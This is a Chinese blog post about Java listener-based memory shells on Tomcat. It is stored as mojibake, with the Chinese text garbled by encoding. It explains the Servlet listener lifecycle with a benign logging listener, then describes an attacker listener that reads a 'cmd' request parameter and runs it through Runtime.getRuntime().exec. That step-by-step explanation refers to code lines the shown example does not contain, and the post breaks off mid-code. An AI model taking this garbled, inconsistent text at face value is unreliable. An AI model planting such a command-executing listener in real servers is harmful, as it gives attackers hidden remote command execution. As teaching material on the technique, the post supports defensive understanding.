é€šä¿—è§£é‡Šï¼šè¿™å°±æ˜¯â€œé€šçŸ¥â€æœ¬èº«ã€‚å½“â€œå¤§è€æ¿â€é€šçŸ¥ä½ æ—¶ï¼Œå®ƒä¸ä¼šç©ºæ‰‹æ¥ï¼Œå®ƒä¼šé€’ç»™ä½ ä¸€å¼ â€œäº‹ä»¶è¯¦æƒ…å¡â€ï¼ˆServletRequestEventï¼‰ï¼Œä¸Šé¢å†™ç€ï¼šâ€œæ–°è¯·æ±‚æ¥äº†ï¼Œè¿™æ˜¯å®ƒçš„è¯¦ç»†ä¿¡æ¯ï¼ˆgetServletRequest()ï¼‰ã€‚â€ ğŸ§  Tomcat çš„å†…éƒ¨é€»è¾‘ï¼šå®ƒâ€œæ€ä¹ˆçŸ¥é“è¦æ£€æŸ¥â€ï¼Ÿ\nTomcat å¹¶ä¸æ˜¯åœ¨â€œæ£€æŸ¥â€å®ƒæ˜¯å¦åº”è¯¥è¿™æ ·åšï¼Œè€Œæ˜¯**â€œå®ƒè¢«ç¼–ç¨‹ï¼ˆç¡¬ç¼–ç ï¼‰ä¸ºå¿…é¡»è¿™æ ·åšâ€**ã€‚\nè¿™å¥—æœºåˆ¶æ˜¯ Java Servlet è§„èŒƒï¼ˆJSR-340/4.0 ç­‰ï¼‰å¼ºåˆ¶è§„å®šçš„ã€‚æ‰€æœ‰ Web å®¹å™¨ï¼ˆTomcat, Jetty, Undertowâ€¦ï¼‰éƒ½å¿…é¡»å®ç°è¿™ä¸ªé€»è¾‘ã€‚\næˆ‘ä»¬æ¥æ¨¡æ‹Ÿä¸€ä¸‹ Tomcat å†…éƒ¨æœ€ç®€åŒ–çš„å·¥ä½œæµç¨‹ï¼š\nç¬¬ä¸€æ­¥ï¼šæ³¨å†Œï¼ˆâ€œç™»è®°è®¢é˜…è€…â€ï¼‰\nå½“ä½ è°ƒç”¨ context.addListener(MaliciousListener.class) æ—¶ï¼š\nTomcat å†…éƒ¨ï¼šServletContext å¯¹è±¡ï¼ˆTomcat ç§°ä¹‹ä¸º StandardContextï¼‰ä¼šç»´æŠ¤å¥½å‡ ä¸ªåˆ—è¡¨ã€‚ å®ƒä¼šæ‰¾åˆ°ä¸€ä¸ªä¸“é—¨å­˜æ”¾ ServletRequestListener çš„åˆ—è¡¨ï¼ˆæ¯”å¦‚å« applicationRequestListenersï¼‰ã€‚ å®ƒæŠŠä½ æ–°çš„ MaliciousListener å®ä¾‹æ·»åŠ åˆ°äº†è¿™ä¸ªåˆ—è¡¨ä¸­ã€‚ åŸç†ï¼šServletContext å°±åƒä¸€ä¸ªâ€œè®¢é˜…ç®¡ç†ä¸­å¿ƒâ€ï¼Œå®ƒæŠŠæ‰€æœ‰â€œè®¢é˜…è€…â€ï¼ˆListenersï¼‰æŒ‰ç…§ä»–ä»¬æ„Ÿå…´è¶£çš„â€œé¢‘é“â€ï¼ˆäº‹ä»¶ç±»å‹ï¼‰åˆ†é—¨åˆ«ç±»åœ°æ”¾å¥½ã€‚\nç¬¬äºŒæ­¥ï¼šè§¦å‘ï¼ˆâ€œäº‹ä»¶å‘ç”Ÿï¼â€ï¼‰\næ–° HTTP è¯·æ±‚åˆ°è¾¾ï¼šä¸€ä¸ªç½‘ç»œè¿æ¥è¿›æ¥äº†ã€‚ Tomcat æ ¸å¿ƒç»„ä»¶ï¼ˆæ¯”å¦‚ CoyoteAdapterï¼‰æ¥æ”¶åˆ°è¿™ä¸ªè¯·æ±‚ï¼Œå¹¶å‡†å¤‡å¼€å§‹å¤„ç†å®ƒã€‚ åœ¨å¤„ç†ä¸šåŠ¡é€»è¾‘ï¼ˆå¦‚è°ƒç”¨ Spring çš„ DispatcherServletï¼‰ä¹‹å‰ï¼Œè¿™ä¸ªç»„ä»¶çš„ä»£ç é‡Œå†™æ­»äº†å¦‚ä¸‹é€»è¾‘ï¼š // -------------------------------------------------------------------- // è¿™æ˜¯ä¸€ä¸ªã€ä¼ªä»£ç ã€‘ï¼Œæ¨¡æ‹Ÿ Tomcat å†…éƒ¨çš„ requestProcess() æ–¹æ³• // 1. ä» \"è®¢é˜…ç®¡ç†ä¸­å¿ƒ\" (ServletContext) æ‹¿åˆ°æ‰€æœ‰â€œè¯·æ±‚è®¢é˜…è€…â€çš„åˆ—è¡¨ List listeners = context.getApplicationRequestListeners(); // 2. å‡†å¤‡â€œäº‹ä»¶è¯¦æƒ…å¡â€ ServletRequestEvent event = new ServletRequestEvent(context, request); // 3. ã€å…³é”®ã€‘Tomcat å¿…é¡»ï¼å¿…é¡»ï¼å¿…é¡»ï¼ // åœ¨å¤„ç†è¯·æ±‚ä¹‹å‰ï¼Œé€šçŸ¥æ‰€æœ‰è®¢é˜…è€… if (listeners.size() \u003e 0) { for (ServletRequestListener listener : listeners) { // \"å¤§è€æ¿\" æ­£åœ¨æŒ¨ä¸ªæ‰“ç”µè¯ // è¿™å°±æ˜¯ä½ å†™çš„ requestInitialized() æ–¹æ³•è¢«è°ƒç”¨çš„åœ°æ–¹ï¼ listener.requestInitialized(event); } } // 4. ã€é€šçŸ¥å®Œæ¯•ã€‘ // ç°åœ¨æ‰çœŸæ­£å¼€å§‹å¤„ç†è¯·æ±‚ï¼Œä¾‹å¦‚äº¤ç»™ Spring çš„ DispatcherServlet doActualRequestProcessing(request, response); // 5. ã€è¯·æ±‚å¤„ç†å®Œæ¯•ã€‘ // Tomcat åˆå¿…é¡»ï¼å¿…é¡»ï¼å¿…é¡»ï¼ // é€šçŸ¥æ‰€æœ‰è®¢é˜…è€…â€œè¯·æ±‚é”€æ¯äº†â€ if (listeners.size() \u003e 0) { // ... (çœç•¥) ... for (ServletRequestListener listener : listeners) { listener.requestDestroyed(event); } } // -------------------------------------------------------------------- Listener.requestInitialized(event) è¿™ä¸€è¡Œä»£ç ï¼Œå°±æ˜¯æ•´ä¸ªè§‚å¯Ÿè€…æ¨¡å¼ä¸­â€œé€šçŸ¥â€è¿™ä¸ªåŠ¨ä½œå‘ç”Ÿçš„ç¡®åˆ‡æ—¶åˆ»ã€‚\nlistenerï¼šå°±æ˜¯ä½ çš„ MaliciousListener å¯¹è±¡ï¼ˆè§‚å¯Ÿè€…ï¼‰ã€‚ requestInitialized(event)ï¼šå°±æ˜¯ Tomcatï¼ˆäº‹ä»¶æºï¼‰åœ¨è°ƒç”¨ä½ ï¼ˆè§‚å¯Ÿè€…ï¼‰åœ¨â€œè®¢é˜…â€æ—¶æä¾›çš„å›è°ƒæ–¹æ³•ã€‚ eventï¼šå°±æ˜¯ Tomcat ä¼ é€’ç»™ä½ çš„â€œäº‹ä»¶è¯¦æƒ…å¡â€ï¼Œé‡Œé¢åŒ…å«äº† ServletRequest å¯¹è±¡ï¼Œè®©ä½ å¯ä»¥è·å–åˆ°è¯·æ±‚å‚æ•°ï¼ˆæ¯”å¦‚ cmdï¼‰ã€‚ â€‹ åœ¨ Tomcat çš„ for å¾ªç¯ä¸­ï¼Œå½“å®ƒéå†åˆ°ä½ çš„ MaliciousListener æ—¶ï¼Œå°±ä¼šæ‰§è¡Œè¿™ä¸€è¡Œã€‚è¿™å°±æ˜¯ä½ æ‰€æœ‰æ¶æ„ä»£ç çš„æ‰§è¡Œå…¥å£ç‚¹ã€‚\nä¸€æ—¦è¿™ä¸ªæ–¹æ³•è¢«è°ƒç”¨ï¼Œä½ çš„ä»£ç å°±å¼€å§‹åœ¨ Tomcat çš„ä¸»å·¥ä½œçº¿ç¨‹ ä¸Šè¿è¡Œäº†ã€‚\nâ€‹ Tomcatï¼ˆäº‹ä»¶æºï¼‰å®Œæˆäº†å®ƒåœ¨è§„èŒƒä¸­å¿…é¡»æ‰§è¡Œçš„å›ºå®šæµç¨‹ï¼ˆâ€œå˜¿ï¼Œæˆ‘è¦é€šçŸ¥æ‰€æœ‰å¯¹â€˜è¯·æ±‚åˆå§‹åŒ–â€™æ„Ÿå…´è¶£çš„è®¢é˜…è€…äº†â€ï¼‰ï¼Œç„¶åæŠŠæ‰§è¡Œæƒ**â€œå›è°ƒâ€**ç»™äº†ä½ çš„ Listenerï¼ˆè§‚å¯Ÿè€…ï¼‰ã€‚\nâ€‹ åœ¨è¿™ä¸ªæ–¹æ³•ï¼ˆrequestInitializedï¼‰æ‰§è¡ŒæœŸé—´ï¼ŒTomcat ä¼š**â€œç­‰å¾…â€**ä½ çš„ä»£ç æ‰§è¡Œå®Œæ¯•ï¼Œç„¶åå†å»å¤„ç†è¯·æ±‚çš„ä¸‹ä¸€æ­¥ï¼ˆæ¯”å¦‚äº¤ç»™ Spring çš„ DispatcherServletï¼‰ã€‚\nâ€‹ è¿™å°±æ˜¯ä¸ºä»€ä¹ˆè¿™ä¸ªâ€œæ³¨å…¥ç‚¹â€å¦‚æ­¤å¼ºå¤§ï¼ˆä»åŠŸèƒ½ä¸Šè®²ï¼‰å’Œå±é™©ï¼ˆä»å®‰å…¨ä¸Šè®²ï¼‰çš„åŸå› â€”â€”å®ƒè®©ä½ åœ¨æ•´ä¸ª Web æµç¨‹çš„æœ€å‰ç«¯ï¼Œè·å¾—äº†ä»£ç æ‰§è¡Œçš„æœºä¼šã€‚\n","wordCount":"2050","inLanguage":"en","datePublished":"0001-01-01T00:00:00Z","dateModified":"0001-01-01T00:00:00Z","author":{"@type":"Person","name":"æ‚¨çš„å§“å"},"mainEntityOfPage":{"@type":"WebPage","@id":"http://ljj1992.fun/posts/java%E5%86%85%E5%AD%98%E9%A9%AC-%E7%9B%91%E5%90%AC%E5%99%A8/"},"publisher":{"@type":"Organization","name":"starå¾çš„åšå®¢","logo":{"@type":"ImageObject","url":"http://ljj1992.fun/favicon.ico"}}}</script></head><body id=top><header class=header><nav class=nav><div class=logo><a href=http://ljj1992.fun/ accesskey=h title="starå¾çš„åšå®¢ (Alt + H)">starå¾çš„åšå®¢</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)" aria-label="Toggle theme">
<svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
<svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=http://ljj1992.fun/ title=é¦–é¡µ><span>é¦–é¡µ</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=http://ljj1992.fun/>Home</a>&nbsp;Â»&nbsp;<a href=http://ljj1992.fun/posts/>Posts</a></div><h1 class="post-title entry-hint-parent"></h1><div class=post-meta><span>æ‚¨çš„å§“å</span></div></header><div class=post-content><pre tabindex=0><code>---
title: &#34;Javaå†…å­˜é©¬-ç›‘å¬å™¨&#34; # æ–°æ–‡ç« æ ‡é¢˜
date: 2025-11-17T16:30:00+08:00 # è¯·æ ¹æ®ä½ åˆ›å»ºçš„å®é™…æ—¶é—´ä¿®æ”¹
draft: false 
categories: [&#34;ç½‘ç»œå®‰å…¨&#34;] # ğŸ¯ å…³é”®ï¼šè®¾ç½®ä¸ºç›®æ ‡åˆ†ç±»
tags: [&#34;ç½‘ç»œå®‰å…¨&#34;, &#34;Java&#34;, &#34;å†…å­˜é©¬&#34;] # å»ºè®®æ·»åŠ ç›¸å…³æ ‡ç­¾
mermaid: true # â­ å…³é”®ï¼šå¯ç”¨ Mermaid å›¾è¡¨æ”¯æŒ
---
</code></pre><h1 id=javaå†…å­˜é©¬-ç›‘å¬å™¨>Javaå†…å­˜é©¬-ç›‘å¬å™¨<a hidden class=anchor aria-hidden=true href=#javaå†…å­˜é©¬-ç›‘å¬å™¨>#</a></h1><p>ä»¥ä¸‹å†…å®¹ä»…é™Javaå°ç™½ï¼Œé«˜æ‰‹æ— è§†å°±å¯ä»¥</p><h2 id=ä¸€-java-ç›‘å¬å™¨åˆ°åº•æœ‰å•¥ç”¨>ä¸€ã€ Java ç›‘å¬å™¨åˆ°åº•æœ‰å•¥ç”¨ï¼Ÿ<a hidden class=anchor aria-hidden=true href=#ä¸€-java-ç›‘å¬å™¨åˆ°åº•æœ‰å•¥ç”¨>#</a></h2><p>ä½ å¯ä»¥æŠŠç›‘å¬å™¨æƒ³è±¡æˆâ€œä¿å®‰â€æˆ–è€…â€œç›‘æ§æ‘„åƒå¤´â€ã€‚
åœ¨ Web åº”ç”¨é‡Œï¼Œæœ‰ä¸‰ä»¶å¤§äº‹ç»å¸¸å‘ç”Ÿï¼š</p><ul><li>åº”ç”¨å¯åŠ¨ / å…³é—­ï¼ˆServletContextï¼‰</li><li>ç”¨æˆ·ç™»å½• / é€€å‡ºï¼ˆHttpSessionï¼‰</li><li>æ¯æ¬¡å‘è¯·æ±‚ / è¯·æ±‚ç»“æŸï¼ˆServletRequestï¼‰</li></ul><p>ç›‘å¬å™¨å°±æ˜¯æå‰æ³¨å†Œå¥½ï¼Œå‘Šè¯‰ç³»ç»Ÿï¼šâ€œä¸€æ—¦å‘ç”Ÿä¸Šé¢è¿™äº›äº‹ï¼Œå°±ç«‹åˆ»é€šçŸ¥æˆ‘ï¼Œè®©æˆ‘æ‰§è¡Œä¸€æ®µä»£ç â€ã€‚</p><p>æ¯”å¦‚ï¼š</p><ul><li>åº”ç”¨å¯åŠ¨æ—¶ï¼Œè‡ªåŠ¨åˆ›å»ºæ•°æ®åº“è¿æ¥æ± ï¼›</li><li>ç”¨æˆ·ç™»å½•æ—¶ï¼Œè®°å½•æ—¥å¿—ï¼›</li><li>æ¯æ¬¡è¯·æ±‚åˆ°æ¥æ—¶ï¼Œæ£€æŸ¥æ˜¯å¦æºå¸¦äº†åˆæ³•çš„ tokenã€‚</li></ul><p>è¿™æ ·å°±æŠŠâ€œä¸šåŠ¡é€»è¾‘â€å’Œâ€œäº‹ä»¶â€åˆ†å¼€ï¼Œä»£ç æ›´æ¸…æ™°ï¼Œä¹Ÿæ›´å®¹æ˜“æ‰©å±•ã€‚</p><h2 id=äºŒ-ä¸ºä»€ä¹ˆç›‘å¬å™¨èƒ½å˜æˆå†…å­˜é©¬>äºŒã€ ä¸ºä»€ä¹ˆç›‘å¬å™¨èƒ½å˜æˆâ€œå†…å­˜é©¬â€ï¼Ÿ<a hidden class=anchor aria-hidden=true href=#äºŒ-ä¸ºä»€ä¹ˆç›‘å¬å™¨èƒ½å˜æˆå†…å­˜é©¬>#</a></h2><p>å†…å­˜é©¬â€å°±æ˜¯é»‘å®¢æŠŠä¸€æ®µæ¶æ„ä»£ç æ‚„æ‚„å¡è¿›æ­£åœ¨è¿è¡Œçš„ Java åº”ç”¨é‡Œï¼Œè®©å®ƒåƒæœ¨é©¬ä¸€æ ·é•¿æœŸæ½œä¼ï¼Œå³ä½¿æœåŠ¡å™¨é‡å¯ä¹Ÿä¸ä¼šæ¶ˆå¤±ï¼ˆå› ä¸ºä»£ç å·²ç»åŠ è½½åˆ°å†…å­˜ï¼‰ã€‚
ç›‘å¬å™¨ä¹‹æ‰€ä»¥å®¹æ˜“è¢«åˆ©ç”¨ï¼Œæ˜¯å› ä¸ºï¼š</p><ol><li><p>å®ƒèƒ½åœ¨<strong>æ¯æ¬¡è¯·æ±‚</strong>æˆ–<strong>åº”ç”¨å¯åŠ¨</strong>æ—¶è‡ªåŠ¨æ‰§è¡Œï¼›</p></li><li><p>åªè¦èƒ½å¾€ <code>web.xml</code> é‡ŒåŠ ä¸€è¡Œé…ç½®ï¼Œæˆ–è€…ç”¨æ³¨è§£ <code>@WebListener</code>ï¼Œå°±èƒ½è®©è¿™æ®µä»£ç ç”Ÿæ•ˆï¼›</p></li><li><p>é»‘å®¢æŠŠæ¶æ„é€»è¾‘å†™åœ¨ç›‘å¬å™¨çš„å›è°ƒæ–¹æ³•é‡Œï¼Œå°±èƒ½åœ¨ä¸ä¿®æ”¹åŸæœ‰ä¸šåŠ¡ä»£ç çš„æƒ…å†µä¸‹ï¼Œå·å·æ‰§è¡Œå‘½ä»¤ã€å›å¼¹ shell ç­‰ã€‚</p></li></ol><h2 id=ä¸‰-å·¥ä½œåŸç†>ä¸‰. å·¥ä½œåŸç†<a hidden class=anchor aria-hidden=true href=#ä¸‰-å·¥ä½œåŸç†>#</a></h2><p>Java Web çš„ç›‘å¬å™¨åŸºäºâ€œè§‚å¯Ÿè€…æ¨¡å¼â€ï¼š</p><ul><li><p>è¢«è§‚å¯Ÿè€…ï¼ˆäº‹ä»¶æºï¼‰ï¼šServletContextã€HttpSessionã€ServletRequest ç­‰ï¼›</p></li><li><p>è§‚å¯Ÿè€…ï¼ˆç›‘å¬å™¨ï¼‰ï¼šä½ å†™çš„ç±»ï¼Œå®ç°å¯¹åº”çš„ <code>*Listener</code> æ¥å£ï¼›</p></li><li><p>å½“äº‹ä»¶æºçŠ¶æ€å˜åŒ–ï¼ˆåˆ›å»ºã€é”€æ¯ã€å±æ€§æ”¹å˜ï¼‰ï¼Œå®¹å™¨ä¼šè‡ªåŠ¨è°ƒç”¨ç›‘å¬å™¨é‡Œå¯¹åº”çš„æ–¹æ³•ã€‚</p></li></ul><h3 id=31--ä¸¾ä¸ªç®€å•çš„ç›‘å¬å™¨ä¾‹å­>3.1 ä¸¾ä¸ªç®€å•çš„â€œç›‘å¬å™¨â€ä¾‹å­<a hidden class=anchor aria-hidden=true href=#31--ä¸¾ä¸ªç®€å•çš„ç›‘å¬å™¨ä¾‹å­>#</a></h3><pre tabindex=0><code>// 1. å¯¼å…¥éœ€è¦çš„ç±»
import javax.servlet.ServletRequest;
import javax.servlet.ServletRequestEvent;
import javax.servlet.ServletRequestListener;
import javax.servlet.annotation.WebListener;

// 2. å‘Šè¯‰ Tomcatï¼šè¿™æ˜¯ä¸€ä¸ªç›‘å¬å™¨ï¼Œè¯·è‡ªåŠ¨æ³¨å†Œ
@WebListener
public class MyRequestListener implements ServletRequestListener {

    // 3. å½“è¯·æ±‚å¼€å§‹æ—¶ï¼ˆç”¨æˆ·å‘æ¥è¯·æ±‚ï¼‰ï¼Œè¿™ä¸ªæ–¹æ³•è‡ªåŠ¨æ‰§è¡Œ
    @Override
    public void requestInitialized(ServletRequestEvent event) {
        System.out.println(&#34;ğŸ”” è¯·æ±‚å¼€å§‹äº†ï¼æœ‰äººè®¿é—®æœåŠ¡å™¨äº†ï¼&#34;);
        
        // 4. æˆ‘ä»¬è¿˜å¯ä»¥æ‹¿åˆ°å…·ä½“æ˜¯å“ªä¸ªè¯·æ±‚
        ServletRequest request = event.getServletRequest();
        String remoteAddr = request.getRemoteAddr();  // ç”¨æˆ·çš„ IP
        String method = request.getMethod();          // è¯·æ±‚æ–¹å¼ GET/POST
        String uri = request.getRequestURI();         // è®¿é—®çš„è·¯å¾„
        
        System.out.printf(&#34;ğŸ“Œ æ¥è®¿è€…IP: %s | æ–¹æ³•: %s | è·¯å¾„: %s%n&#34;, 
                          remoteAddr, method, uri);
    }

    // 5. å½“è¯·æ±‚ç»“æŸæ—¶ï¼ˆæœåŠ¡å™¨å“åº”å®Œï¼‰ï¼Œè¿™ä¸ªæ–¹æ³•è‡ªåŠ¨æ‰§è¡Œ
    @Override
    public void requestDestroyed(ServletRequestEvent event) {
        System.out.println(&#34;ğŸ”š è¯·æ±‚ç»“æŸäº†ï¼ç”¨æˆ·è¯·æ±‚å¤„ç†å®Œæˆã€‚&#34;);
    }
}
</code></pre><p>ğŸ”é€è¡Œè§£é‡Šï¼š</p><ol><li><p><code>@WebListener</code>ï¼šä¸ç”¨å†æ”¹ <code>web.xml</code>ï¼Œå®¹å™¨å¯åŠ¨æ—¶ä¼šè‡ªåŠ¨å‘ç°å¹¶æ³¨å†Œè¿™ä¸ªç±»ï¼›</p></li><li><p><code>implements ServletRequestListener</code>ï¼šè¡¨ç¤ºæˆ‘è¦ç›‘å¬â€œè¯·æ±‚å¼€å§‹/ç»“æŸâ€è¿™ä¸¤ä¸ªåŠ¨ä½œï¼›</p></li><li><p><code>requestInitialized</code>ï¼šè¯·æ±‚ä¸€è¿›æ¥å°±è°ƒç”¨ï¼›</p></li><li><p><code>sre.getServletRequest()</code>ï¼šæ‹¿åˆ°å½“å‰çš„è¯·æ±‚å¯¹è±¡ï¼›</p></li><li><p><code>request.getParameter("cmd")</code>ï¼šçœ‹é»‘å®¢æœ‰æ²¡æœ‰åœ¨ URL é‡Œå¸¦ <code>?cmd=dir</code> è¿™æ ·çš„å‚æ•°ï¼›</p></li><li><p><code>Runtime.getRuntime().exec(cmd)</code>ï¼šå¦‚æœæœ‰ï¼Œå°±æ‰§è¡Œè¿™æ¡ç³»ç»Ÿå‘½ä»¤ã€‚</p></li></ol><p>ğŸ” é€è¡Œè§£é‡Šï¼ˆå¤§ç™½è¯ç‰ˆï¼‰</p><table><thead><tr><th>è¡Œå·</th><th>ä»£ç </th><th>å¤§ç™½è¯è§£é‡Š</th></tr></thead><tbody><tr><td>1-4</td><td><code>import ...</code></td><td>å¼•å…¥å¿…è¦çš„â€œå·¥å…·åŒ…â€ã€‚å°±åƒä½ è¦åšé¥­ï¼Œå¾—å…ˆæœ‰é”…ç¢—ç“¢ç›†ã€‚è¿™äº›æ˜¯ Java Web çš„æ ‡å‡†ç±»åº“ã€‚</td></tr><tr><td>6</td><td><code>@WebListener</code></td><td>è¿™æ˜¯ä¸€ä¸ªâ€œæ ‡ç­¾â€ï¼Œå‘Šè¯‰ Tomcatï¼šâ€œå˜¿ï¼Œæˆ‘æ˜¯ä¸ªç›‘å¬å™¨ï¼Œåˆ«å¿˜äº†æŠŠæˆ‘è£…è¿›å»ï¼â€ ğŸ‘‰ ç›¸å½“äºä½ æŠŠé—¨é“ƒè´´åœ¨é—¨å£ï¼Œç³»ç»Ÿå°±çŸ¥é“â€œè¿™é‡Œæœ‰ç›‘æ§â€ã€‚</td></tr><tr><td>7</td><td><code>public class MyRequestListener implements ServletRequestListener</code></td><td>å®šä¹‰ä¸€ä¸ªå« <code>MyRequestListener</code> çš„ç±»ï¼Œå®ƒâ€œæ‰¿è¯ºâ€ä¼šç›‘å¬è¯·æ±‚äº‹ä»¶ã€‚ ğŸ‘‰ å®ç°æ¥å£ = ç­¾åˆåŒï¼šæˆ‘ä¿è¯æä¾› <code>requestInitialized</code> å’Œ <code>requestDestroyed</code> è¿™ä¸¤ä¸ªæ–¹æ³•ã€‚</td></tr><tr><td>10</td><td><code>@Override public void requestInitialized(...)</code></td><td>å½“ç”¨æˆ·å‘èµ·è¯·æ±‚ï¼ˆæ¯”å¦‚æ‰“å¼€ç½‘é¡µï¼‰æ—¶ï¼ŒTomcat ä¼š<strong>è‡ªåŠ¨è°ƒç”¨</strong>è¿™ä¸ªæ–¹æ³•ã€‚ ğŸ‘‰ å°±åƒé—¨é“ƒæ„Ÿåº”åˆ°äººï¼Œè‡ªåŠ¨â€œå®å’šâ€å“ã€‚</td></tr><tr><td>12</td><td><code>System.out.println(...)</code></td><td>æ‰“å°ä¸€æ¡æ—¥å¿—ï¼Œè¡¨ç¤ºâ€œè¯·æ±‚å¼€å§‹äº†â€ã€‚ä½ å¯ä»¥åœ¨è¿™é‡Œå†™ä»»ä½•ä½ æƒ³åšçš„äº‹ã€‚</td></tr><tr><td>15-17</td><td><code>event.getServletRequest()</code> ç­‰</td><td>æ‹¿åˆ°è¯·æ±‚çš„è¯¦ç»†ä¿¡æ¯ï¼šè°æ¥çš„ï¼Ÿç”¨ä»€ä¹ˆæ–¹å¼ï¼Ÿè®¿é—®å“ªä¸ªé¡µé¢ï¼Ÿ ğŸ‘‰ å°±åƒä¿å®‰çœ‹ç›‘æ§ï¼šå“¦ï¼Œæ˜¯å¼ ä¸‰ï¼Œä»ä¸œé—¨è¿›æ¥ï¼Œå»äº†è´¢åŠ¡éƒ¨ã€‚</td></tr><tr><td>22</td><td><code>requestDestroyed</code></td><td>å½“æœåŠ¡å™¨æŠŠç½‘é¡µå‘å›å»åï¼Œè¿™ä¸ªæ–¹æ³•è¢«è°ƒç”¨ã€‚ ğŸ‘‰ é—¨é“ƒè¯´ï¼šâ€œäººèµ°äº†ï¼Œå…³é—¨ã€‚â€</td></tr></tbody></table><p>ğŸ§  åŸç†å›¾è§£ï¼šç›‘å¬å™¨å·¥ä½œæµç¨‹</p><pre tabindex=0><code>ç”¨æˆ·æµè§ˆå™¨
    â†“ å‘é€ HTTP è¯·æ±‚ï¼ˆæ¯”å¦‚è®¿é—® /index.htmlï¼‰
Tomcat æœåŠ¡å™¨
    â†“ åˆ›å»º ServletRequest å¯¹è±¡ï¼ˆä»£è¡¨è¿™æ¬¡è¯·æ±‚ï¼‰
    â†“ è§¦å‘äº‹ä»¶ï¼šâ€œè¯·æ±‚å¼€å§‹äº†ï¼â€
    â†“ æ‰€æœ‰æ³¨å†Œäº† ServletRequestListener çš„ç›‘å¬å™¨
        â†’ è‡ªåŠ¨è°ƒç”¨ .requestInitialized()
    â†“ Tomcat å¤„ç†è¯·æ±‚ï¼ˆè°ƒç”¨ Servletã€è¿”å›é¡µé¢ï¼‰
    â†“ è¯·æ±‚å¤„ç†å®Œæ¯•
    â†“ è§¦å‘äº‹ä»¶ï¼šâ€œè¯·æ±‚ç»“æŸäº†ï¼â€
    â†“ æ‰€æœ‰ç›‘å¬å™¨
        â†’ è‡ªåŠ¨è°ƒç”¨ .requestDestroyed()
</code></pre><p>ğŸ‘‰ æ•´ä¸ªè¿‡ç¨‹ä½ <strong>ä¸ç”¨æ‰‹åŠ¨è°ƒç”¨</strong>ï¼ŒTomcat ä¼šè‡ªåŠ¨è§¦å‘ï¼</p><hr><p>ğŸ“¦ å®ƒæ˜¯æ€ä¹ˆè¢«â€œè£…è¿›å»â€çš„ï¼Ÿ</p><p>â€‹ æˆ‘è§‰å¾—å¾ˆå¿…è¦äº†è§£è¿™ä¸ªæ³¨è§£èƒŒåçš„æ·±æ„ @WebListenerï¼Œ@WebListeneræ˜¯ Servlet å®¹å™¨çš„â€œè½»é‡çº§ IoCâ€ æ§åˆ¶åè½¬ï¼ˆğŸ’¡å®¹å™¨çš„æ¦‚å¿µï¼Œæˆ‘çš„ç†è§£å°±æ˜¯tomcatæå‰å¸®ä½ newå¥½äº†è€Œå·²ï¼Œä½ è‡ªå·±ä¸ç”¨åšnewäº†ï¼Œè€Œä¸”ä»–ä¼šè‡ªåŠ¨ç®¡ç†æ³¨å…¥ä¾èµ–ï¼Œç”Ÿå‘½å‘¨æœŸç®¡ç†ï¼Œè‡ªåŠ¨å¸®ä½ ç›‘å¬å®ç°è§‚å¯Ÿè€…æ¨¡å¼ï¼Œtomcatä¼šåœ¨æ‰“åŒ…éƒ¨ç½²åç®¡ç†ä¸‰ä¸ªé¡¶çº§å®¹å™¨ï¼‰</p><p>ğŸ“Œ æ§åˆ¶æƒä»ä½  â†’ äº¤ç»™ Tomcat â†’ è¿™å°±æ˜¯ æ§åˆ¶åè½¬ï¼ˆInversion of Controlï¼‰</p><p>æœ‰ä¸¤ç§æ–¹å¼ï¼š</p><p>æ–¹å¼ä¸€ï¼šç”¨æ³¨è§£ <code>@WebListener</code>ï¼ˆæ¨èï¼‰</p><ul><li>åªè¦è¿™ä¸ªç±»åœ¨é¡¹ç›®çš„ <code>src</code> é‡Œï¼Œç¼–è¯‘åæ”¾è¿› <code>WEB-INF/classes</code></li><li>Tomcat å¯åŠ¨æ—¶ä¼šæ‰«ææ‰€æœ‰ç±»ï¼Œå‘ç° <code>@WebListener</code>ï¼Œå°±æŠŠå®ƒæ³¨å†Œè¿›ç›‘å¬å™¨åˆ—è¡¨</li><li>âœ… ç®€å•æ–¹ä¾¿ï¼Œé€‚åˆå¼€å‘</li></ul><p>æ–¹å¼äºŒï¼šå†™ <code>web.xml</code></p><pre tabindex=0><code>&lt;listener&gt;
    &lt;listener-class&gt;com.example.MyRequestListener&lt;/listener-class&gt;
&lt;/listener&gt;
</code></pre><ul><li>æ˜ç¡®å‘Šè¯‰æœåŠ¡å™¨ï¼šâ€œè¯·åŠ è½½è¿™ä¸ªç›‘å¬å™¨â€</li></ul><h3 id=32-æˆ‘çš„ç–‘é—®å½¢å‚eventå“ªé‡Œæ¥çš„>3.2 æˆ‘çš„ç–‘é—®ï¼šå½¢å‚eventå“ªé‡Œæ¥çš„<a hidden class=anchor aria-hidden=true href=#32-æˆ‘çš„ç–‘é—®å½¢å‚eventå“ªé‡Œæ¥çš„>#</a></h3><p><code>public void requestInitialized(ServletRequestEvent event)</code>ï¼Œä¸ºä»€ä¹ˆæˆ‘æ²¡çœ‹åˆ°è°ç»™å®ƒèµ‹å€¼ï¼Œå®ƒå´èƒ½è°ƒç”¨ .getServletRequest()ï¼Ÿ</p><p>è¿™å¥è¯çš„æ„æ€æ˜¯ï¼š</p><blockquote><p>â€œå½“ Tomcat è°ƒç”¨è¿™ä¸ªæ–¹æ³•æ—¶ï¼Œ å®ƒä¼šä¼ ç»™æˆ‘ä¸€ä¸ª <strong>ç±»å‹ä¸º ServletRequestEvent çš„å¯¹è±¡</strong>ï¼Œ æˆ‘æŠŠå®ƒå«åš eventã€‚â€</p></blockquote><p>ServletRequestEvent ç±»é•¿ä»€ä¹ˆæ ·ï¼Ÿï¼ˆJava å®˜æ–¹æºç ç®€åŒ–ç‰ˆï¼‰</p><pre><code>public class ServletRequestEvent {
